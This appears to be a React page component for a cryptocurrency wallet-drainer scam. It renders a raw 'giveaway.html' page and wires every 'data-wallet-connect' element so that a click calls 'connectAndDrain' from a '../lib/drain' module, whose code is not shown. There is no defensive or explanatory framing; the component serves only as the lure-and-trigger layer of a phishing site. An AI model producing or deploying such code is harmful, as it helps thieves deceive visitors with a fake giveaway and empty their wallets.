// import { connectAndDrain } from '../lib/drain'

import { useEffect } from "react";

export default function Home() {
  useEffect(() => {
    let connectAndDrain: () => void;

    if (typeof window !== "undefined") {
      ({ connectAndDrain } = require("../lib/drain"));
    }

    const els = document.querySelectorAll("[data-wallet-connect]");

    els.forEach(el => {
      el?.addEventListener("click", () => {
        connectAndDrain();
      });
    })
  }, []);

  return (
    <div
      dangerouslySetInnerHTML={{
        __html: require("!raw-loader!../giveaway.html").default,
      }}
    />
  );
}
